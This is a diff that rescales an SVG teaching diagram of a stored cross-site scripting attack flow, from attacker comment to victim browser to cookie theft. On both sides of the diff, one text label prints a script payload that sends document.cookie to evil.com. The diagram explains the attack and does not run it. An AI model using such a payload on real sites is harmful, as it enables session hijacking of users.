@@ -1,36 +1,36 @@
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif">
   <!-- palette: resources/palette_diagram.yaml -->
-  <rect x="32.2247" y="12.5491" width="1095.6378" height="627.4509" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
-  <text x="580.0435" y="50.1961" text-anchor="middle" font-size="22.5883" font-weight="bold" fill="var(--text)">Stored XSS Attack Flow</text>
-  <text x="64.4493" y="87.8432" font-size="15.0588" fill="var(--text-muted)">1. Attacker posts malicious comment:</text>
-  <text x="88.6178" y="110.4314" font-size="13.8039" fill="var(--danger-accent)">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</text>
-  <rect x="64.4493" y="131.7647" width="193.3478" height="56.4706" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
-  <text x="161.1232" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Attacker</text>
-  <rect x="370.5834" y="131.7647" width="209.4602" height="56.4706" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
-  <text x="475.3134" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Web Server</text>
-  <rect x="692.8297" y="131.7647" width="209.4602" height="56.4706" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
-  <text x="797.5599" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Database</text>
-  <line x1="257.7971" y1="159.3726" x2="370.5834" y2="159.3726" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#ar6)" />
-  <line x1="580.0435" y1="159.3726" x2="692.8297" y2="159.3726" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#ar6)" />
-  <text x="64.4493" y="232.1568" font-size="15.0588" fill="var(--text-muted)">2. Victim views the page with the comment</text>
-  <line x1="797.5599" y1="188.2353" x2="797.5599" y2="263.5294" stroke="var(--primary-border)" stroke-width="1.8823" />
-  <rect x="64.4493" y="263.5294" width="193.3478" height="69.0196" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
-  <text x="161.1232" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Victim</text>
-  <text x="161.1232" y="313.7254" text-anchor="middle" font-size="13.8039" fill="var(--text-muted)">Browser</text>
-  <rect x="370.5834" y="263.5294" width="209.4602" height="69.0196" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
-  <text x="475.3134" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Web Server</text>
-  <text x="475.3134" y="313.7254" text-anchor="middle" font-size="13.8039" fill="var(--text-muted)">serves page</text>
-  <rect x="692.8297" y="263.5294" width="209.4602" height="69.0196" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
-  <text x="797.5599" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Database</text>
-  <text x="797.5599" y="313.7254" text-anchor="middle" font-size="13.8039" fill="var(--text-muted)">returns data</text>
-  <line x1="370.5834" y1="297.4117" x2="257.7971" y2="297.4117" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#ar6b)" />
-  <line x1="692.8297" y1="297.4117" x2="580.0435" y2="297.4117" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#ar6b)" />
-  <text x="64.4493" y="376.4705" font-size="15.0588" fill="var(--text-muted)">3. Browser executes the script</text>
-  <line x1="161.1232" y1="332.549" x2="161.1232" y2="401.5686" stroke="var(--danger-border)" stroke-width="1.8823" />
-  <rect x="64.4493" y="401.5686" width="290.0218" height="69.0196" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
-  <text x="209.4602" y="430.4314" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">evil.com</text>
-  <text x="209.4602" y="455.5294" text-anchor="middle" font-size="13.8039" fill="var(--text-muted)">receives session cookie</text>
-  <text x="402.808" y="439.2157" font-size="15.0588" fill="var(--danger-accent)">4. Cookie sent to attacker</text>
+  <rect x="40" y="40" width="1200" height="580" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
+  <text x="639.9999" y="74.8" text-anchor="middle" font-size="22.7282" font-weight="bold" fill="var(--text)">Stored XSS Attack Flow</text>
+  <text x="75.2941" y="109.6" font-size="15.1521" fill="var(--text-muted)">1. Attacker posts malicious comment:</text>
+  <text x="101.7647" y="130.48" font-size="13.8894" fill="var(--danger-accent)">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</text>
+  <rect x="75.2941" y="150.1999" width="211.7647" height="52.2" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
+  <text x="181.1764" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Attacker</text>
+  <rect x="410.5882" y="150.1999" width="229.4118" height="52.2" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
+  <text x="525.294" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Web Server</text>
+  <rect x="763.5293" y="150.1999" width="229.4118" height="52.2" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
+  <text x="878.2353" y="182.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Database</text>
+  <line x1="287.0587" y1="175.72" x2="410.5882" y2="175.72" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#ar6)" />
+  <line x1="639.9999" y1="175.72" x2="763.5293" y2="175.72" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#ar6)" />
+  <text x="75.2941" y="242.9999" font-size="15.1521" fill="var(--text-muted)">2. Victim views the page with the comment</text>
+  <line x1="878.2353" y1="202.4" x2="878.2353" y2="271.9999" stroke="var(--primary-border)" stroke-width="1.8823" />
+  <rect x="75.2941" y="271.9999" width="211.7647" height="63.8" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
+  <text x="181.1764" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Victim</text>
+  <text x="181.1764" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)">Browser</text>
+  <rect x="410.5882" y="271.9999" width="229.4118" height="63.8" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
+  <text x="525.294" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Web Server</text>
+  <text x="525.294" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)">serves page</text>
+  <rect x="763.5293" y="271.9999" width="229.4118" height="63.8" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
+  <text x="878.2353" y="298.6799" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">Database</text>
+  <text x="878.2353" y="318.3999" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)">returns data</text>
+  <line x1="410.5882" y1="303.3199" x2="287.0587" y2="303.3199" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#ar6b)" />
+  <line x1="763.5293" y1="303.3199" x2="639.9999" y2="303.3199" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#ar6b)" />
+  <text x="75.2941" y="376.3999" font-size="15.1521" fill="var(--text-muted)">3. Browser executes the script</text>
+  <line x1="181.1764" y1="335.7999" x2="181.1764" y2="399.5999" stroke="var(--danger-border)" stroke-width="1.8823" />
+  <rect x="75.2941" y="399.5999" width="317.6471" height="63.8" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
+  <text x="234.1176" y="426.28" text-anchor="middle" font-size="15.1521" font-weight="bold" fill="var(--text)">evil.com</text>
+  <text x="234.1176" y="449.48" text-anchor="middle" font-size="13.8894" fill="var(--text-muted)">receives session cookie</text>
+  <text x="445.8823" y="434.4" font-size="15.1521" fill="var(--danger-accent)">4. Cookie sent to attacker</text>
   <defs>
     <style id="palette-vars">
       :root, svg {
